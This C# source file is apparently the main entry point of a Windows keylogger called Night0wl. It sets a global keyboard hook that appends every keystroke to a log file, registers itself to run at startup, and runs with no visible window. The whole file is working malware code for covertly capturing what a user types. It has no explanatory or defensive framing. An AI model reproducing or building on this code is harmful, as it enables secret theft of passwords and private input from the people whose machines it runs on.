using System;
using System.IO;
using System.Windows.Forms;
using Night0wl.Common;
using Night0wl.HookApi;
using Night0wl.Startup;

namespace Night0wl
{
    internal static class Program
    {
        private static Hook hook;

        [STAThread]
        static void Main()
        {
            try
            {
                var fullpath = Path.Combine(Const.OUT_DIR, Const.OUT_FILE);
                Action<VkCode> onKeyChanged = vkCode => { File.AppendAllText(fullpath, vkCode.GetDescription()); };
                hook = Hook.GetInstance(onKeyChanged);

                RegistryManager.MakeAppRunOnStartup();

                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.ApplicationExit += OnApplicationExit;
                Application.Run();
            }
            catch (Exception e)
            {
                var errorsFilePath = Path.Combine(Const.OUT_DIR, Const.ERROR_FILE);
                var errorLogMessage = string.Format("{0}{1}{2}{1}{1}", DateTime.UtcNow, Environment.NewLine, e.Message);
                File.AppendAllText(errorsFilePath, errorLogMessage);
            }
        }
        private static void OnApplicationExit(object sender, EventArgs e)
        {
            hook.Dispose();
        }
    }
}